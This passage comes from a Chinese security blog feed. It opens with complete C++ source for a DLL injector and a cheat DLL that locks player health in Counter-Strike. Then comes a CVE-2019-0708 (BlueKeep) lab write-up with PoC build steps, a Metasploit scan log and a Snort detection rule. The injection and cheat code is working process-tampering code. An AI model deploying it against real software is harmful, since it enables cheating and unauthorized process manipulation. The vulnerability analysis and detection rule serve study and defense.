函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;atlstr.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>CString strMsg;<br>HANDLE hToken;<br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TOKEN_ALL_ACCESS, &amp;hToken)) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Open process token failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>LUID luid;<br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;luid)) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Query privilegevalue failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>TOKEN_PRIVILEGES tkp;<br>tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>tkp.Privileges[<span class="hljs-number">0</span>].Luid = luid;<br>tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tkp, <span class="hljs-built_in">sizeof</span>(tkp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Adjust process privilege token failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>HWND hWindow = ::<span class="hljs-built_in">FindWindow</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Counter-Strike&quot;</span>));<br><span class="hljs-keyword">if</span> (hWindow == <span class="hljs-literal">NULL</span>) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;FindWindow failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>DWORD dwPid = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">GetWindowThreadProcessId</span>(hWindow, &amp;dwPid);<br><span class="hljs-keyword">if</span> (dwPid == <span class="hljs-number">0</span>) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;GetWindowThreadProcessId() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>HANDLE hCSProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);<br><span class="hljs-keyword">if</span> (hCSProcess == <span class="hljs-literal">NULL</span>) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;OpenProcess() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">char</span> dllName[] = <span class="hljs-string">&quot;CHEATINGPLUGIN.dll&quot;</span>;<br>DWORD size = <span class="hljs-built_in">strlen</span>(dllName) + <span class="hljs-number">5</span>;<br>LPVOID lpAddr = <span class="hljs-built_in">VirtualAllocEx</span>(hCSProcess, <span class="hljs-literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (lpAddr == <span class="hljs-literal">NULL</span>) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;VirtualAllocEx() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">WriteProcessMemory</span>(<br>hCSProcess,<br>lpAddr,<br>dllName,<br>size,<br><span class="hljs-literal">NULL</span><br>)) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;WriteProcessMemory() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)::<span class="hljs-built_in">GetProcAddress</span>(::<span class="hljs-built_in">GetModuleHandle</span>(<br><span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Kernel32.dll&quot;</span>)),<br><span class="hljs-string">&quot;LoadLibraryA&quot;</span><br>);<br>HANDLE hThreadHandle = ::<span class="hljs-built_in">CreateRemoteThread</span>(hCSProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pfnStartAddr, lpAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hThreadHandle) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;CreateRemoteThread() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//MessageBox(NULL, &quot;Succeed!&quot;, &quot;Congratulations&quot;, MB_OK);</span><br>&#125;<br></code></pre></td></tr></table></figure><p>Dll文件代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">cheating</span><span class="hljs-params">(LPVOID lpParam)</span> </span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>DWORD health = <span class="hljs-number">100</span>;<br><br>DWORD addr = <span class="hljs-number">0x01A17C78</span>;<br><br>DWORD res = <span class="hljs-built_in">WriteProcessMemory</span>(INVALID_HANDLE_VALUE, (LPVOID)addr, &amp;health, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">30</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br><span class="hljs-comment">//MessageBox(NULL, &quot;Dll Attached&quot;, &quot;!!!&quot;, MB_OK);</span><br>::<span class="hljs-built_in">DisableThreadLibraryCalls</span>(hModule);<br><span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, cheating, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到cs进程打开此文件并创建了一个新的线程：</p><p><img src="https://i.loli.net/2019/08/04/PU6KBli5SQvkfTI.png"></p><p>效果如下，左下角血量（锁血延迟设置的较高0.3s，所以被秒没办法hhhh，我起了，一枪秒了，有什么好说的🔫）：</p><p><img src="https://i.loli.net/2019/08/04/sS3rQ8RkNxZo5O4.png"></p><p><img src="https://github.com/Hvnt3r/My_Images/blob/master/cs_dll_inject.gif?raw=true"></p><p>其实在做这个期间遇到一些坑：</p><ul><li><code>DllMain()</code>中不要创建多线程，易造成死锁，或者是长时间无返回的函数如<code>MessageBox()</code></li><li><code>CreateRemoteThread()</code>创建远程线程时，<code>Dll</code>中不能含有静态变量如静态字符串或者static声明的函数，会在附加时产生一些权限问题，且data段已经确定无法修改，这样操作可能会使远程线程崩溃</li><li>最好不要创建模态窗口</li><li>等等。。。</li></ul>]]></content>
    
    
    <categories>
      
      <category>反外挂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>游戏安全</tag>
      
      <tag>进程注入</tag>
      
      <tag>DLL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-0708</title>
    <link href="/2019/05/CVE-2019-0708/"/>
    <url>/2019/05/CVE-2019-0708/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><strong>复现环境：</strong></p><blockquote><p>攻击机：Kali Linux（Windows子系统）</p><p>目标主机：Windows 7 SP1 64位</p></blockquote><p><strong>准备环境|Poc下载&#x2F;编译</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install dh-autoreconf<br>sudo apt install libssl-dev<br>sudo apt install libx11-dev<br>git <span class="hljs-built_in">clone</span> https://github.com/zerosum0x0/CVE-2019-0708.git<br><span class="hljs-built_in">cd</span> CVE-2019-0708/rdesktop-fork-bd6aa6acddf0ba640a49834807872f4cc0d0a773/<br>./bootstrap<br>./configure --disable-credssp --disable-smartcard<br>make<br>./rdesktop 192.168.1.7:3389<br></code></pre></td></tr></table></figure><span id="more"></span><p>不知这个Poc在其他环境下编译结果如何，在我的Kali和Ubuntu的虚拟机和子系统中均未运行成功，我运行的是此作者的Metasploit版本Poc，Ruby文件在<a href="https://github.com/zerosum0x0/CVE-2019-0708%E4%B8%AD%EF%BC%8C%E5%B0%86%E6%96%87%E4%BB%B6%E6%94%BE%E5%88%B0Metasploit-FrameWork%E4%B8%8Bauxiliary/scanner/rdp/%E8%B7%AF%E5%BE%84%E4%B8%AD%EF%BC%8C%E9%AA%8C%E8%AF%81%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/zerosum0x0/CVE-2019-0708中，将文件放到Metasploit-FrameWork下auxiliary/scanner/rdp/路径中，验证结果如下：</a></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"> <span class="hljs-comment">⚡</span> <span class="hljs-comment">root@kali</span>  <span class="hljs-comment">~</span>  <span class="hljs-comment">msfconsole</span><br>                                                  <br>     <span class="hljs-string">,</span>           <span class="hljs-string">,</span><br>    <span class="hljs-comment">/</span>             <span class="hljs-comment">\</span><br>   <span class="hljs-comment">((__</span>--<span class="hljs-literal">-</span><span class="hljs-string">,</span><span class="hljs-string">,</span><span class="hljs-string">,</span>--<span class="hljs-literal">-</span><span class="hljs-comment">__))</span><br>      <span class="hljs-comment">(_)</span> <span class="hljs-comment">O</span> <span class="hljs-comment">O</span> <span class="hljs-comment">(_)_________</span><br>         <span class="hljs-comment">\</span> <span class="hljs-comment">_</span> <span class="hljs-comment">/</span>            <span class="hljs-comment">|\</span><br>          <span class="hljs-comment">o_o</span> <span class="hljs-comment">\</span>   <span class="hljs-comment">M</span> <span class="hljs-comment">S</span> <span class="hljs-comment">F</span>   <span class="hljs-comment">|</span> <span class="hljs-comment">\</span><br>               <span class="hljs-comment">\</span>   <span class="hljs-comment">_____</span>  <span class="hljs-comment">|</span>  <span class="hljs-comment">*</span><br>                <span class="hljs-comment">|||</span>   <span class="hljs-comment">WW|||</span><br>                <span class="hljs-comment">|||</span>     <span class="hljs-comment">|||</span><br><br><br>       <span class="hljs-comment">=</span><span class="hljs-title">[</span> <span class="hljs-comment">metasploit</span> <span class="hljs-comment">v4</span><span class="hljs-string">.</span><span class="hljs-comment">17</span><span class="hljs-string">.</span><span class="hljs-comment">21</span><span class="hljs-literal">-</span><span class="hljs-comment">dev</span>                         <span class="hljs-title">]</span><br><span class="hljs-literal">+</span> -- --<span class="hljs-comment">=</span><span class="hljs-title">[</span> <span class="hljs-comment">1822</span> <span class="hljs-comment">exploits</span> <span class="hljs-literal">-</span> <span class="hljs-comment">1035</span> <span class="hljs-comment">auxiliary</span> <span class="hljs-literal">-</span> <span class="hljs-comment">316</span> <span class="hljs-comment">post</span>       <span class="hljs-title">]</span><br><span class="hljs-literal">+</span> -- --<span class="hljs-comment">=</span><span class="hljs-title">[</span> <span class="hljs-comment">539</span> <span class="hljs-comment">payloads</span> <span class="hljs-literal">-</span> <span class="hljs-comment">42</span> <span class="hljs-comment">encoders</span> <span class="hljs-literal">-</span> <span class="hljs-comment">10</span> <span class="hljs-comment">nops</span>            <span class="hljs-title">]</span><br><span class="hljs-literal">+</span> -- --<span class="hljs-comment">=</span><span class="hljs-title">[</span> <span class="hljs-comment">Free Metasploit Pro trial: http://r</span><span class="hljs-literal">-</span><span class="hljs-comment">7</span><span class="hljs-string">.</span><span class="hljs-comment">co/trymsp</span> <span class="hljs-title">]</span><br><br><span class="hljs-comment">msf</span> &gt; <span class="hljs-comment">use</span> <span class="hljs-comment">auxiliary/scanner/rdp/bluekeep</span><br><span class="hljs-comment">msf</span> <span class="hljs-comment">auxiliary(scanner/rdp/bluekeep)</span> &gt; <span class="hljs-comment">show</span> <span class="hljs-comment">options</span><br><br><span class="hljs-comment">Module</span> <span class="hljs-comment">options</span> <span class="hljs-comment">(auxiliary/scanner/rdp/bluekeep):</span><br><br>   <span class="hljs-comment">Name</span>     <span class="hljs-comment">Current</span> <span class="hljs-comment">Setting</span>  <span class="hljs-comment">Required</span>  <span class="hljs-comment">Description</span><br>   --<span class="hljs-literal">-</span><span class="hljs-literal">-</span>     --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><br>   <span class="hljs-comment">RHOSTS</span>                    <span class="hljs-comment">yes       The target address range</span> <span class="hljs-comment">or</span> <span class="hljs-comment">CIDR</span> <span class="hljs-comment">identifier</span><br>   <span class="hljs-comment">RPORT</span>    <span class="hljs-comment">3389</span>             <span class="hljs-comment">yes       The target port (TCP)</span><br>   <span class="hljs-comment">THREADS</span>  <span class="hljs-comment">1</span>                <span class="hljs-comment">yes</span>       <span class="hljs-comment">The</span> <span class="hljs-comment">number</span> <span class="hljs-comment">of</span> <span class="hljs-comment">concurrent</span> <span class="hljs-comment">threads</span><br><br><span class="hljs-comment">msf</span> <span class="hljs-comment">auxiliary(scanner/rdp/bluekeep)</span> &gt; <span class="hljs-comment">set</span> <span class="hljs-comment">RHOSTS</span> <span class="hljs-comment">192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">80</span><span class="hljs-string">.</span><span class="hljs-comment">129</span><br><span class="hljs-comment">RHOSTS</span> <span class="hljs-comment">=</span>&gt; <span class="hljs-comment">192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">80</span><span class="hljs-string">.</span><span class="hljs-comment">129</span><br><span class="hljs-comment">msf</span> <span class="hljs-comment">auxiliary(scanner/rdp/bluekeep)</span> &gt; <span class="hljs-comment">run</span><br><br><span class="hljs-title">[</span><span class="hljs-literal">+</span><span class="hljs-title">]</span> <span class="hljs-comment">192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">80</span><span class="hljs-string">.</span><span class="hljs-comment">129:3389</span>   <span class="hljs-literal">-</span> <span class="hljs-comment">The</span> <span class="hljs-comment">target</span> <span class="hljs-comment">is</span> <span class="hljs-comment">vulnerable</span><span class="hljs-string">.</span><br><span class="hljs-title">[</span><span class="hljs-comment">*</span><span class="hljs-title">]</span> <span class="hljs-comment">Scanned</span> <span class="hljs-comment">1</span> <span class="hljs-comment">of</span> <span class="hljs-comment">1</span> <span class="hljs-comment">hosts</span> <span class="hljs-comment">(100%</span> <span class="hljs-comment">complete)</span><br><span class="hljs-title">[</span><span class="hljs-comment">*</span><span class="hljs-title">]</span> <span class="hljs-comment">Auxiliary</span> <span class="hljs-comment">module</span> <span class="hljs-comment">execution</span> <span class="hljs-comment">completed</span><br></code></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote><p>The Remote Desktop Protocol (RDP) enables connection between a client and endpoint, defining the data communicated between them in virtual channels. Virtual channels are bidirectional data pipes which enable the extension of RDP. Windows Server 2000 defined 32 Static Virtual Channels (SVCs) with RDP 5.1, but due to limitations on the number of channels further defined Dynamic Virtual Channels (DVCs), which are contained within a dedicated SVC. SVCs are created at the start of a session and remain until session termination, unlike DVCs which are created and torn down on demand.</p><p>It’s this 32 SVC binding which CVE-2019-0708 patch fixes within the <em>_IcaBindVirtualChannels</em> and <em>_IcaRebindVirtualChannels</em> functions in the RDP driver termdd.sys. As can been seen in figure 1, the RDP Connection Sequence connections are initiated and channels setup prior to Security Commencement, which enables CVE-2019-0708 to be wormable since it can self-propagate over the network once it discovers open port 3389.</p></blockquote><p>远程桌面协议（RDP）支持客户端和端点之间的连接，定义虚拟通道中它们之间通信的数据。虚拟通道是双向数据管道，可以扩展RDP。 Windows Server 2000使用RDP 5.1定义了32个静态虚拟通道（SVC），但由于进一步定义了动态虚拟通道（DVC）的通道数量限制，这些通道包含在专用SVC中。 SVC在会话开始时创建并保持到会话终止，这与根据需要创建和拆除的DVC不同。</p><p>这是32个SVC绑定，CVE-2019-0708补丁修复了RDP驱动程序termdd.sys中的* _IcaBindVirtualChannels 和* _IcaRebindVirtualChannels 函数。如图1所示，RDP连接序列连接在安全开始之前启动并进行通道设置，这使得CVE-2019-0708可以设置，因为它可以在发现开放端口3389后通过网络自我传播。</p><p><img src="https://i.loli.net/2019/05/29/5cee2fc371cee59122.png"></p><p>图：RDP协议序列</p><blockquote><p>The vulnerability is due to the “MS_T120” SVC name being bound as a reference channel to the number 31 during the GCC Conference Initialization sequence of the RDP protocol. This channel name is used internally by Microsoft and there are no apparent legitimate use cases for a client to request connection over an SVC named “MS_T120.”</p><p>Figure 2 shows legitimate channel requests during the GCC Conference Initialization sequence with no MS_T120 channel.</p></blockquote><p>该漏洞是由于“MS_T120”SVC名称在RDP协议的GCC会议初始化序列期间被绑定为数字31的参考信道。 此通道名称由Microsoft在内部使用，并且客户端没有明显的合法用例来请求通过名为“MS_T120”的SVC进行连接。</p><p>下图显示了没有MS_T120信道的GCC会议初始化序列期间的合法信道请求。</p><p><img src="https://i.loli.net/2019/05/29/5cee30198697475600.png"></p><p>图：标准GCC会议初始化序列</p><blockquote><p>However, during GCC Conference Initialization, the Client supplies the channel name which is not whitelisted by the server, meaning an attacker can setup another SVC named “MS_T120” on a channel other than 31. It’s the use of MS_T120 in a channel other than 31 that leads to heap memory corruption and remote code execution (RCE).</p></blockquote><p>但是，在GCC会议初始化期间，客户端提供服务器未列入白名单的频道名称，这意味着攻击者可以在31以外的频道上设置另一个名为“MS_T120”的SVC。这是在31以外的频道中使用MS_T120 这会导致堆内存损坏和远程代码执行（RCE）。</p><p><img src="https://i.loli.net/2019/05/29/5cee3064994e040472.png"></p><p>图:异常&#x2F;可疑GCC会议初始化序列 - 非标准信道上的MS_T120</p><blockquote><p>The components involved in the MS_T120 channel management are highlighted in figure 4. The MS_T120 reference channel is created in the rdpwsx.dll and the heap pool allocated in rdpwp.sys. The heap corruption happens in termdd.sys when the MS_T120 reference channel is processed within the context of a channel index other than 31.</p></blockquote><p>图中突出显示了MS_T120通道管理中涉及的组件.MS_D120引用通道在rdpwsx.dll和rdpwp.sys中分配的堆池中创建。 当在31以外的通道索引的上下文中处理MS_T120引用通道时，堆损坏发生在termdd.sys中。</p><p><img src="https://i.loli.net/2019/05/29/5cee3089252b376521.png"></p><p>图：Windows内核和用户组件</p><blockquote><p>The Microsoft patch as shown in figure 5 now adds a check for a client connection request using channel name “MS_T120” and ensures it binds to channel 31 <strong>only</strong>(1Fh) in the <em>_IcaBindVirtualChannels</em> and <em>_IcaRebindVirtualChannels</em> functions within termdd.sys.</p></blockquote><p>如图所示的Microsoft补丁现在使用通道名称“MS_T120”添加对客户端连接请求的检查，并确保它仅绑定到termdd.sys中的* _IcaBindVirtualChannels 和* _IcaRebindVirtualChannels 函数中的通道31（1Fh）。</p><p><img src="https://i.loli.net/2019/05/29/5cee31b917b3b10229.png"></p><p>图：Microsoft补丁添加通道绑定检查</p><h2 id="防火墙规则"><a href="#防火墙规则" class="headerlink" title="防火墙规则"></a>防火墙规则</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs snort">alert tcp any any -&gt; any 3389 (msg:&quot;NCC GROUP RDP connection setup with MS_T120 channel, potential CVE-2019-0708&quot;; flow:to_server,established; content:&quot;|03 00|&quot;; offset:0; depth:2; content:&quot;|02 f0|&quot;; distance:2; within:2; content:&quot;|00 05 00 14 7c 00 01|&quot;; within:512; content:&quot;|03 c0|&quot;; distance:3; within:384; content:&quot;MS_T120|00|&quot;; distance:6; within:372; threshold: type limit, track by_src, count 2, seconds 600; classtype:bad-unknown; reference:url,portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708; sid:190708; rev:1;)<br></code></pre></td></tr></table></figure><p><strong>参考资料：</strong></p><p>Mcafee官博：<a href="https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/">https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows系统安全</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开源网络入侵检测系统-Snort实战</title>
    <link href="/2019/05/%E5%BC%80%E6%BA%90%E7%BD%91%E7%BB%9C%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-Snort%E5%AE%9E%E6%88%98/"/>
    <url>/2019/05/%E5%BC%80%E6%BA%90%E7%BD%91%E7%BB%9C%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-Snort%E5%AE%9E%E6%88%98/</url>
    
